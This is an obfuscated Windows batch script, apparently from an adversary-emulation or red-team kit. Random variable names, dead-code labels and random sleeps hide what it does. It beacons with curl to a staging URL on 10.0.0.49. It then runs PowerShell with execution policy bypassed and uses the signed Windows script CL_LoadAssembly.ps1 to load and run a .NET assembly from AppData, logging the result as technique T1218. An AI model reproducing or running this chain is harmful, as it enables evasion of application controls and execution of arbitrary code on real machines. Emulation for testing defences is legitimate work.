@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\7704\4f2ef267
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7704-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=project.txt
SET dvhhyc=7704
SET ujfwhf=0

REM Derived variables (using random names, NOT PHR_)
SET zxmqp=!mdvfmsbx!
SET vcbmqx=!txisnba!\!xzanpex!
SET vxvgha=C:\Windows\diagnostics\system\Audio
SET mfqmwr=%APPDATA%\!rrocubc!\macula-simulations.log
SET mxdwge=CL_LoadAssembly.ps1

REM State machine variables
SET aqdmxc=0
SET aqdmxc=!aqdmxc!
GOTO lqpswd

:dead_gltpr
REM Unreachable junk code
SET hkyb=never_executed
SET /A fake=1+2+3
GOTO dead_smklp

:lqpswd
REM State dispatcher
IF !aqdmxc!==0 GOTO state_aqyxp
IF !aqdmxc!==17 GOTO state_kwvnh
IF !aqdmxc!==42 GOTO state_zcqmk
IF !aqdmxc!==99 GOTO state_end
GOTO dead_gltpr

:dead_vyrsb
REM More dead code
ECHO This never appears >nul
EXIT /B 1

REM ************************
REM STATE 0: Initialization
REM ************************
:state_aqyxp
REM Initial delay 30-60s
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_START=initializing>> "!mfqmwr!" 2>nul)
SET /A wqmxv=%RANDOM% %% 30 + 30
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP=!wqmxv!s>> "!mfqmwr!" 2>nul)
timeout /t !wqmxv! /nobreak >nul
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP_RESULT=done|errorlevel=!ERRORLEVEL!>> "!mfqmwr!" 2>nul)
SET aqdmxc=17
GOTO lqpswd

:junk_tlpsq
REM Dead branch
GOTO state_end

REM ************************
REM STATE 17: Heartbeat check
REM ************************
:state_kwvnh
REM Random delay 5-15s
SET /A bhgvy=%RANDOM% %% 10 + 5
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP=!bhgvy!s>> "!mfqmwr!" 2>nul)
ping -n !bhgvy! 127.0.0.1 >nul
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP_RESULT=done|errorlevel=!ERRORLEVEL!>> "!mfqmwr!" 2>nul)

REM Heartbeat check
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_START=!keghkgto!>> "!mfqmwr!" 2>nul)
curl.exe -k -s -o nul "!keghkgto!"
SET ygakf=!ERRORLEVEL!
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_RESULT=errorlevel=!ygakf!>> "!mfqmwr!" 2>nul)

SET aqdmxc=42
GOTO lqpswd

:junk_rxtlp
REM Unreachable conditional
IF 0==1 (
    SET fake=should_not_run
    GOTO dead_smklp
)

:dead_smklp
REM Dead end
EXIT /B 0

REM ************************
REM STATE 42: Execute assembly
REM ************************
:state_zcqmk
REM Random delay 10-30s
SET /A kqytr=%RANDOM% %% 20 + 10
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP=!kqytr!s>> "!mfqmwr!" 2>nul)
timeout /t !kqytr! /nobreak >nul
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SLEEP_RESULT=done|errorlevel=!ERRORLEVEL!>> "!mfqmwr!" 2>nul)

REM Change directory
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR=!vxvgha!>> "!mfqmwr!" 2>nul)
cd /d "!vxvgha!" 2>nul
SET gzrky=!ERRORLEVEL!
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR_RESULT=errorlevel=!gzrky!>> "!mfqmwr!" 2>nul)

REM Execute assembly (TTP T1218)
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_START=powershell.exe -ep bypass -command "set-location -path !vxvgha!; import-module .\!mxdwge!; LoadAssemblyFromPath !vcbmqx!;[Program]::Dale()">> "!mfqmwr!" 2>nul)
powershell.exe -ep bypass -command "set-location -path !vxvgha!; import-module .\!mxdwge!; LoadAssemblyFromPath '!vcbmqx!';[Program]::Dale()"
SET bhqds=!ERRORLEVEL!
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_RESULT=errorlevel=!bhqds!>> "!mfqmwr!" 2>nul)

REM TTP logging
FOR /F "tokens=2-4 delims=/ " %%A IN ("!DATE!") DO SET fytr=%%C-%%A-%%B
SET tgxf=!TIME!
SET dtstamp=!fytr! !tgxf!
IF !bhqds!==0 (
    SET rezw=1
    SET gfbwe=
) ELSE (
    SET rezw=0
    SET gfbwe=assembly_load_failed
)
ECHO [!dtstamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!rezw!:!gfbwe!>> "!mfqmwr!" 2>nul || ECHO >nul

SET aqdmxc=99
GOTO lqpswd

:junk_mgfln
REM Dead conditional jump
SET tmp=1
IF !tmp!==2 GOTO dead_vyrsb

REM ************************
REM STATE 99: Clean exit
REM ************************
:state_end
IF "!ujfwhf!"=="1" (ECHO [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_END=exit_code=!bhqds!>> "!mfqmwr!" 2>nul)
EXIT /B !bhqds!

:junk_extra1
REM Unreachable final dead code
SET tvtb=more_junk
GOTO junk_extra2

:junk_extra2
EXIT /B 255